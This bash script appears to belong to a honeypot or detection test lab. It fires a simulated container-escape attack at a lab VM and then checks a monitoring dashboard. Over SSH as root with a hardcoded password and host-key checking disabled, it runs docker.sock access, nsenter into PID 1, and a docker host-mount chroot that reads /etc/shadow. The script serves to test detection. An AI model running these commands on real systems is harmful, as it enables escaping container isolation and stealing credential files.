#!/usr/bin/env bash
# Container Escape Attack
# Docker sock access, nsenter, chroot to host — escaping container isolation.
#
# Usage:  scripts/attack-container-escape.sh [VM-IP]
# Default VM IP: 192.168.1.79
#
# Dashboard: http://<VM-IP>:5173
# What to look for: container_escape category, docker.sock/nsenter in commands

set -euo pipefail
IP="${1:-192.168.1.79}"
echo ""
echo "==================================================================="
echo "  Container Escape Attack"
echo "==================================================================="
echo "  Target:    $IP:2222"
echo "  Category:  container_escape"
echo "==================================================================="
echo ""

sshpass -p "password" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -p 2222 \
  root@$IP \
  "cat /var/run/docker.sock 2>/dev/null ; nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'whoami' ; docker run -v /:/host -it alpine chroot /host cat /etc/shadow" 2>&1 || true

echo ""
echo "  ✓ Attack complete"
echo "  → Dashboard:  http://$IP:5173"
echo "  → API check:  curl -s http://$IP:5000/api/events?attack_category=container_escape&limit=3 | python3 -m json.tool"
echo ""
